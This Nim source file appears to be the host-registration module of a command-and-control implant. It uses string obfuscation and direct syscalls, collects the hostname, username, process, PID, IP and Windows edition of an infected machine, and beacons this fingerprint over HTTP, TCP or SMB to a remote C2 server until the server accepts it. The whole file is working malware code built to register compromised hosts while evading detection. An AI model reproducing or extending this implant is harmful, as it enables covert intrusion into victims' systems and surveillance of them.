import ../global
import ../general/strings
import ../general/metadata
import ../winapi/ssn
import ../winapi/syscall
import ../winapi/utils
import ../winapi/handlers
import ../network/http as nhttp
import ../network/tcp as ntcp
import ../network/smb as nsmb
import ../network/relay_packet
import ../../capabilities/sleep/core
import std/[parseutils, random, strutils]
import std/json

type
  FpUnicodeString = object
    length: uint16
    maximumLength: uint16
    buffer: pointer

const fpProcessImageName = 27'u32

func fpNtCurrentVersion(): string {.inline.} =
  obf("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")

proc mapEditionLabel(editionId: string): string =
  if editionId == obf("Professional"):
    obf("Pro")
  elif editionId == obf("Core"):
    obf("Home")
  elif editionId == obf("CoreSingleLanguage"):
    obf("Home Single Language")
  elif editionId == obf("CoreCountrySpecific"):
    obf("Home China")
  elif editionId == obf("Enterprise"):
    obf("Enterprise")
  elif editionId == obf("Education"):
    obf("Education")
  elif editionId == obf("ProfessionalWorkstation"):
    obf("Pro for Workstations")
  elif editionId == obf("ProfessionalEducation"):
    obf("Pro Education")
  elif editionId == obf("EnterpriseS"):
    obf("Enterprise S")
  elif editionId == obf("EnterpriseG"):
    obf("Enterprise G")
  else:
    editionId

proc regReadString(subKeyPath, valueName: string): string =
  var subKey = newWideCString(subKeyPath)
  var name = newWideCString(valueName)
  var hKey: pointer
  if regOpenKeyExW(hkeyLocalMachine, addr subKey[0], 0, keyRead, addr hKey) != errorSuccess:
    return ""
  defer: discard regCloseKey(hKey)
  var dataSize: culong = 0
  if regQueryValueExW(hKey, addr name[0], nil, nil, nil, addr dataSize) != errorSuccess or dataSize == 0:
    return ""
  let buf = allocRw(dataSize.csize_t)
  if buf == nil:
    return ""
  defer: discard freeMem(buf)
  if regQueryValueExW(hKey, addr name[0], nil, nil, buf, addr dataSize) != errorSuccess:
    return ""
  wideToAscii(buf, dataSize)

proc osProductName(): string =
  let ntCv = fpNtCurrentVersion()
  let productName = regReadString(ntCv, obf("ProductName"))
  let editionId = regReadString(ntCv, obf("EditionID"))
  let installType = regReadString(ntCv, obf("InstallationType"))
  let branch = regReadString(ntCv, obf("BuildBranch"))
  var buildStr = regReadString(ntCv, obf("CurrentBuild"))
  if buildStr.len == 0:
    buildStr = regReadString(ntCv, obf("CurrentBuildNumber"))
  var buildNum = 0
  if buildStr.len > 0:
    discard parseInt(buildStr, buildNum)
  var family = ""
  if installType != obf("Server") and not productName.contains(obf("Server")):
    if branch.len > 0:
      if branch.startsWith(obf("ge_")) or branch.startsWith(obf("ni_")) or branch.startsWith(obf("zn_")):
        family = obf("Windows 11")
      elif branch.startsWith(obf("co_")) or branch.startsWith(obf("vb_")) or branch.startsWith(obf("fe_")):
        family = obf("Windows 10")
    if family.len == 0:
      if buildNum >= 22000:
        family = obf("Windows 11")
      elif buildNum > 0:
        family = obf("Windows 10")
  var edition = ""
  if editionId.len > 0:
    edition = mapEditionLabel(editionId)
  if family.len > 0 and edition.len > 0:
    result = family & " " & edition
  elif productName.len > 0:
    result = productName
  elif family.len > 0:
    result = family

proc ensureReady*(): bool =
  if syscallReady:
    return true
  result = prepareSyscalls()

proc currentUser(): string =
  var size: culong = 256
  let buf = allocRw((size * 2).csize_t)
  if buf == nil:
    return ""
  defer: discard freeMem(buf)
  if getUserNameW(buf, addr size) == 0:
    return ""
  wideToAscii(buf, (size + 1) * 2)

proc currentProcessName(): string =
  if not syscallReady:
    discard prepareSyscalls()
  var need: culong = 0
  var img: array[2048, byte]
  if queryInformationProcess(currentProcess, fpProcessImageName, addr img[0], culong(img.len), addr need) != 0:
    return ""
  let us = cast[ptr FpUnicodeString](addr img[0])
  if us.length == 0 or us.buffer == nil:
    return ""
  var full = wideToAscii(us.buffer, culong(us.length))
  if full.len == 0:
    return ""
  let sep = full.rfind('\\')
  if sep >= 0:
    full[sep + 1 .. ^1]
  else:
    full

proc beaconDelaySec(): int =
  if beaconDelay <= 0: 5 else: beaconDelay

var migrateHostTagDone = false

proc resolveHostTag*(): void =
  if migrateHostTagDone:
    return
  let n = if hostTag.len > 0: hostTag.len else: 6
  randomize()
  const tagChars = "0123456789abcdefghijklmnopqrstuvwxyz"
  var s = ""
  for _ in 0 ..< n:
    s.add tagChars[rand(0 .. tagChars.high)]
  hostTag = s
  migrateHostTagDone = true

proc buildFingerprintJson*(): JsonNode =
  let delaySec = beaconDelaySec()
  let internalIp = getInternalIp()
  result = %*{
    (obf("option")): obf("new"),
    (obf("tag")): hostTag,
    (obf("ip")): internalIp,
    (obf("hostname")): regReadString(
      obf("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName"),
      obf("ComputerName")),
    (obf("user")): currentUser(),
    (obf("arch")): obf("x64"),
    (obf("pid")): getCurrentProcessId(),
    (obf("process")): currentProcessName(),
    (obf("os")): osProductName(),
    (obf("listener")): channel,
    (obf("delay")): delaySec,
    (obf("implant_config")): %*{
      (obf("channel")): channel,
      (obf("host")): host,
      (obf("port")): port,
      (obf("host_tag")): hostTag,
      (obf("delay")): delaySec,
      (obf("syscall_method")): syscallMethod,
      (obf("build_tag")): buildTag,
    },
  }

proc isMissingHostResponse*(body: string): bool =
  if body.len == 0:
    return false
  try:
    let data = parseJson(body)
    if data.kind != JObject or not data.hasKey(obf("status")) or not data.hasKey(obf("error")):
      return false
    data[obf("status")].getStr() == obf("failure") and data[obf("error")].getStr() == obf("Missing host")
  except JsonParsingError:
    false

proc fingerprintAccepted(body: string): bool =
  if body.len == 0: return false
  try:
    let data = parseJson(body)
    if not data.hasKey("message"): return false
    let msg = data["message"].getStr()
    msg == obf("host included") or msg == obf("host already exists")
  except JsonParsingError:
    false

proc transmit_fingerprint(): void =
  var body = buildFingerprintJson()
  body[obf("metadata")] = createMetadata()
  if channel == obf("http") or channel == obf("https"):
    discard nhttp.httpPost($(body))
  elif channel == obf("tcp"):
    var payload = buildEnvelope(body)
    discard ntcp.tcpExchange(payload)
  elif channel == obf("smb"):
    var payload = buildEnvelope(body)
    discard nsmb.smbExchange(payload)

proc sendFingerprint*(): void =
  resolveHostTag()
  if channel == obf("http") or channel == obf("https"):
    while true:
      var body = buildFingerprintJson()
      body[obf("metadata")] = createMetadata()
      let resp = nhttp.httpPost($(body))
      if resp.ok and resp.code == 200 and fingerprintAccepted(resp.body):
        break
      sleep_now()
  elif channel == obf("tcp"):
    while true:
      var body = buildFingerprintJson()
      body[obf("metadata")] = createMetadata()
      var payload = buildEnvelope(body)
      let resp = ntcp.tcpExchange(payload)
      if resp.ok and fingerprintAccepted(resp.body):
        break
      sleep_now()
  elif channel == obf("smb"):
    while true:
      var body = buildFingerprintJson()
      body[obf("metadata")] = createMetadata()
      var payload = buildEnvelope(body)
      let resp = nsmb.smbExchange(payload)
      if resp.ok and fingerprintAccepted(resp.body):
        break
      sleep_now()
  else:
    transmit_fingerprint()
